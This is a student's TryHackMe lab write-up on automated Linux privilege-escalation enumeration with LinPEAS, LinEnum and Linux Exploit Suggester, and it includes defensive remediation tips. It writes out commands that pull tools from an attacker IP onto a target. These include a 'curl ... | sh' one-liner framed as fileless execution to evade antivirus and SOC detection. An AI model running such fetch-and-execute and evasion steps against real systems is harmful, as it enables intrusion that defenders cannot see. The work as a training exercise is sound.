🤖 Automated Recon (Scripted Enumeration)
Platform	TryHackMe, Linux Privilege Escalation
Category	Linux Privilege Escalation
Difficulty	Easy
Status	✅ Done
🎯 Goal
Learn how to use automated enumeration scripts (LinPEAS, LinEnum, LES) to speed up post-exploitation recon, transfer tools stealthily to a target, and manually verify script outputs without falling into the "script kiddie" trap.

Low-privileged shell → Fast automated scan → Manual verification → Root.

🧠 Concept
Manual vs Automated: The Doctor Analogy
In Lab 01, I ran manual commands line by line (uname -a, id, sudo -l, find / -perm -4000). That's like a doctor checking a patient's pulse and blood pressure by hand. It's essential to understand, but doing everything manually on a massive server with thousands of files and background processes takes days. You get tired, and you miss the tiny misconfiguration that holds the root password.

Automated recon solves this. A clever engineer takes 500 manual commands and bundles them into a single text file called a script. You execute the script, and in 30 seconds it runs all 500 commands, parses the output, organizes it, and color-codes the findings.

The Script Kiddie Trap
Script Kiddie	Real Pentester
Downloads a script, runs it, gets 10,000 lines of colored text, and panics	Treats the script as a fast assistant that saves time
Grabs a random string from the output and throws a blind exploit from Google	Knows manual enumeration deeply, using the script to point where to look
If the exploit fails, cries "the machine is broken!"	Uses manual verification to check if the script finding is a true positive
OPSEC: Real World vs CTF Labs
In lab environments (THM / HTB), you can throw any script you want and nobody cares. But in the real world (Red Teaming / Penetration Testing):

Automated scripts generate massive noise on the target server (thousands of system calls per second).
Security teams (SOC / Blue Team) will get an immediate alert: "Automated recon script detected on web01!" and your shell gets killed instantly.
A real pentester understands what the tool does under the hood so they can fall back to quiet manual enumeration when stealth is required.
🚀 Tool Transfer Mechanics
Before running tools, I need to get them from my Kali machine onto the target server over my low-privileged shell.

text

[ My Kali Machine ] ======= (VPN Tunnel) =======> [ Target Server ]
(Holds linpeas.sh)                                (Needs script)
Standard Transfer (Disk Writes)
On Kali: Spin up a temporary Python web server in the folder containing the scripts:

Bash

python3 -m http.server 8000
On Target: Navigate to a world-writable directory (like /tmp) and pull the script using wget or curl:

Bash

cd /tmp
wget http://10.10.14.5:8000/linpeas.sh
# Or using curl if wget is missing:
curl http://10.10.14.5:8000/linpeas.sh -o linpeas.sh
Make executable and run:

Bash

chmod +x linpeas.sh
./linpeas.sh
Pro Move: In-Memory Execution (RAM Only)
To avoid writing files to the disk (which triggers antivirus and leaves artifacts), execute the script directly in memory:

Bash

curl -s http://10.10.14.5:8000/linpeas.sh | sh
(Meaning: fetch linpeas.sh quietly with curl -s and pipe | it directly into the shell sh in RAM without touching the filesystem).

🛠️ The Big Three Tools
1️⃣ LinPEAS (Linux Privilege Escalation Awesome Script)
Created by Carlos Polop, LinPEAS is the absolute king of Linux enumeration. It inspects everything: kernel flaws, sudo rules, SUID/SGID binaries, capabilities, cron jobs, local listening ports, leaked passwords in configs/history, and root processes.

Decoding LinPEAS Colors
LinPEAS outputs thousands of lines. Knowing the color hierarchy is how you stay sane:

Color	Meaning	What to do
🚨 RED / YELLOW	95% PE Vector! Critical finding	STOP the script. Go verify this finding manually immediately
⚠️ RED	High Privilege Vector	Suspicious configuration worth investigating
ℹ️ Bold / Light Cyan	General Information	Users, network interfaces, basic system profile
📝 Blue	Standard System Files	Usually noise, ignore unless stuck
Execution Workflow
Run LinPEAS and redirect output to a file (or view on screen):
Bash

./linpeas.sh > linpeas_out.txt
Search specifically for RED/YELLOW highlights first.
If found, stop automated scanning and switch to manual verification on that specific vector.
2️⃣ LinEnum (The Classic & Clean Alternative)
Created by rebootuser, LinEnum was the king before LinPEAS.

Why use LinEnum when LinPEAS exists?
Speed & Simplicity: LinPEAS can take minutes and generate huge output. LinEnum runs fast and outputs a clean, organized text report.
No Color Spam: Easy to read on minimal terminals or when redirecting to logs.
Legacy Systems: Runs clean on very old Linux distributions where modern scripts might crash.
Standard Execution
Bash

./LinEnum.sh -k password -r report.txt -e /tmp -t
-k password: Searches specifically for the keyword "password".
-e /tmp: Specifies output directory for temporary checks.
-t: Enables thorough, deeper tests.
3️⃣ Linux Exploit Suggester (LES - The Kernel Specialist)
LinPEAS and LinEnum look at everything (files, permissions, cron). Linux Exploit Suggester (LES) focuses on one specific thing: Kernel Exploits.

How it works
LES checks uname -a and distro info, then compares the target's kernel version against a built-in database of known public kernel exploits (CVEs).

Example output:

text

[+] [CVE-2015-1328] overlayfs
    Details: http://www.exploit-db.com/exploits/37292/
    Exposure: highly probable
    Tags: ubuntu=12.04|14.04|14.10|15.04
⚠️ The False Positive Trap
LES checks version numbers only. It does not know if:

The administrator backported a patch without updating the kernel version string.
A required compiler like gcc is missing on the target.
Mindset: When LES flags a kernel vulnerability as highly probable, do not blindly run code. Read the exploit requirements, check if gcc or necessary libraries exist on the system, and verify manually.

🔍 Manual Verification Matrix
Automated scripts find potential vectors; manual verification confirms them.

Script Output	Manual Verification Command	Next Step
LinPEAS flags SUID binary /usr/bin/find	ls -la /usr/bin/find	Check GTFOBins for find Sudo/SUID syntax
LES suggests CVE-2015-1328	uname -a + which gcc	Verify kernel version & confirm compiler availability
LinEnum spots open port 127.0.0.1:3306	ss -tulnp or curl 127.0.0.1:3306	Check if internal MySQL daemon accepts default credentials
🧬 Root Cause
Automated enumeration succeeds because system administration is complex. Misconfigurations accumulate over time (old backup files left in /tmp, forgotten cron jobs, loose file permissions). Automated tools simply map human oversight faster than a manual search can.

🛡️ Remediation
From a defense/hardening perspective:

Exposure	Defense / Countermeasure
Script execution	Restrict /tmp and /dev/shm execution flags (noexec)
Unmonitored recon	Deploy EDR / Auditd to flag rapid, repeated system calls
Password leaks	Audit config files, clear history logs, and enforce strict file permissions (600)
📝 My Lab Notes
What clicked for me:
Automation is an assistant, not a replacement for understanding. The doctor analogy made it crystal clear: a scanner saves time, but you still need to know how to interpret the results.

The game-changer:
Learning in-memory execution using curl -s http://... | sh. Avoiding writing files to disk is a huge deal for real-world OPSEC.

My routine for automated recon:

Try in-memory transfer or standard python server host via /tmp.
Run LinPEAS → Look exclusively for RED/YELLOW highlights first.
If RED/YELLOW appears, stop scanning and switch to manual verification immediately.
If no clear configuration vector appears, run Linux Exploit Suggester as a kernel fallback.
💡 Key Takeaways
Automated scripts give you speed; manual skills give you accuracy.
RED/YELLOW in LinPEAS means 95% chance of PE — stop and verify manually.
Always verify false positives before executing kernel exploits suggested by LES.
In-memory execution (curl | sh) keeps disk footprint minimal for OPSEC.
⬅️ Previous: Manual Enumeration  |  Back to Labs  |  ➡️ Next: Kernel Exploits





